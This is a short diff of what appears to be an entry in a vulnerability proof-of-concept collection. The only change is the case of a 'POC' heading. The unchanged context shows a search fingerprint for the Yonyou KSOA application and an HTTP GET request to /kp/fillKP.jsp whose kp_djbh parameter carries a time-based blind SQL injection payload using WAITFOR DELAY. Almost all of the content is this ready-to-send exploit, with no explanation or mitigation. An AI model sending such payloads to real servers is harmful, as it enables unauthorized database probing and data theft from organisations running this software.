@@ -8,7 +8,7 @@
 app="用友-时空KSOA"
 ```
 
-## poc
+## POC
 
 ```yaml
 GET /kp/fillKP.jsp?kp_djbh=1%27+IF(LEN(db_name())>4)+WAITFOR%20DELAY%20%270:0:2%27+--+ HTTP/1.1
